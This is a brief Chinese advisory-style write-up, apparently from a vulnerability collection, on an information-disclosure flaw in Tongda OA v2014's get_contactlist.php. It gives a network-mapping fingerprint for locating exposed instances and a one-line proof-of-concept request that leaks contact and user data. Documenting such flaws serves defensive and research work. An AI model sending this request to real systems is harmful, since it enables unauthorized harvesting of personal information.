# 通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞

## 漏洞描述

通达OA v2014 get_contactlist.php文件存在信息泄漏漏洞，攻击者通过漏洞可以获取敏感信息，进一步攻击

## 漏洞影响

<a-checkbox checked>通达OA v2014</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="TDXK-通达OA" </a-checkbox></br>

## 漏洞复现

版本信息

![img](../../../.vuepress/public/img/1645975969411-bebd5aae-61d9-427d-bde9-bc31c1375ec3.png)

验证POC

```javascript
/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
```

![img](../../../.vuepress/public/img/1645975996620-255bce78-f9e5-4542-a2cc-4ba7b35fb50e.png)